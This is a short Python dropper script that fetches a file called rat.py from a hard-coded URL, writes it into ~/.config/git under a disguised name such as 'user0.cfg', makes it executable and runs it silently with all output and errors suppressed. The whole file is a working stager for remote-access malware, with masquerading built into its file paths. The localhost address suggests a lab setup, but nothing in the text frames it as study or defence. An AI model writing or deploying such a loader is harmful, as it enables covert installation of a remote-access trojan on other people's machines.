import os, urllib.request, urllib.parse, stat
from subprocess import *

URLS = [["http://localhost:8000/rat.py"]]
DIR = os.path.expanduser("~/.config/git")

os.makedirs(DIR,exist_ok=True)

def get_new_file():
	n = 0
	while True:
		f = f"{DIR}/user{n}.cfg"
		if not os.path.exists(f): return f
		n += 1

for i in URLS:
	for j in i:
		try:
			with urllib.request.urlopen(j) as response:
				if response.code != 200: continue
				n = get_new_file()
				with open(n, "wb") as f:
					f.write(response.read())
				os.chmod(n, os.stat(n).st_mode | stat.S_IEXEC)
				Popen(n, stdout=DEVNULL, stderr=DEVNULL)
		except:
			continue
		else:
			break